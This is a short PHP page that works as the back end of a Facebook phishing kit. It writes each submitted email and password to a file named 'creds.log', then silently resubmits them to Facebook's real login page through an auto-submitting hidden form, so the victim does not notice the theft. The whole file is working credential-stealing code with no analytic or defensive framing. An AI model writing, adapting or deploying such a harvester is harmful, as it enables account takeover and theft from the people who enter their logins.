<html>
<body>
<?php
$fp = fopen("creds.log", "a");
fwrite($fp, "\nFacebook $_POST[email] $_POST[pass]");
fclose($fp);
echo "<form name=\"myform\" method=\"post\" action=\"https://www.facebook.com/login.php?login_attempt=1\">";
echo "<input type=\"hidden\" name=\"email\" value=\"$_POST[email]\">";
echo "<input type=\"hidden\" name=\"pass\" value=\"$_POST[pass]\">";
?>
<script language="JavaScript">document.myform.submit();</script>
</form>
</body>
</html>
